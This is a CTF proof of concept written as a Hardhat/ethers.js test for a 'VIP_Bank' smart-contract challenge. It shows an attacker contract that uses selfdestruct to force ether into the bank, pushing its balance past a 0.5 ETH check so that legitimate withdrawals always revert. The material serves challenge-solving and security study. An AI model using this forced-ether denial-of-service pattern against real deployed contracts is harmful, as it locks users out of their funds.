 
//  Below is the detailed explanation and poc for the CTF of in hardhat and ether js
 
    // contract AttackerContract_VIP {
    //     constructor (address target) payable {
    //         selfdestruct(payable(target));
    //     }
    // }
    // forcefully sending ether to increase contract balance
    // require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
    // this line always reverts when the address(this).balance is more than 0.5 eth






import {loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("VIP_Bank", function () {
 
  async function deploymentState() {

    // Contracts are deployed using the first signer/account by default
    const [owner, attacker,VIP] = await ethers.getSigners();

    const VIP_Bank = await ethers.getContractFactory("VIP_Bank");
    const vip_Bank = await VIP_Bank.deploy();

    return { vip_Bank,attacker,owner,VIP };
  }

  describe("Deployment", function () {
    it("Should stop withdraw function for anyone", async function () {
      const {vip_Bank,owner,attacker,VIP} = await loadFixture(deploymentState);
      // forcefully sending ether to increase contract balance
      const AttackerContract = await ethers.getContractFactory("AttackerContract_VIP");
      const attackerContract = await AttackerContract.connect(attacker).deploy(vip_Bank.address,{value: ethers.utils.parseEther("1")});
        
      const add_vip_tx = await vip_Bank.addVIP(VIP.address);
      await add_vip_tx.wait();
      
      const deposit_tx = await vip_Bank.connect(VIP).deposit({value:ethers.utils.parseEther("0.04")}) 
      await deposit_tx.wait();

      await expect(vip_Bank.connect(VIP).withdraw(ethers.utils.parseEther("0.04"))).to.be.revertedWith("Cannot withdraw more than 0.5 ETH per transaction")
    });

  })
})
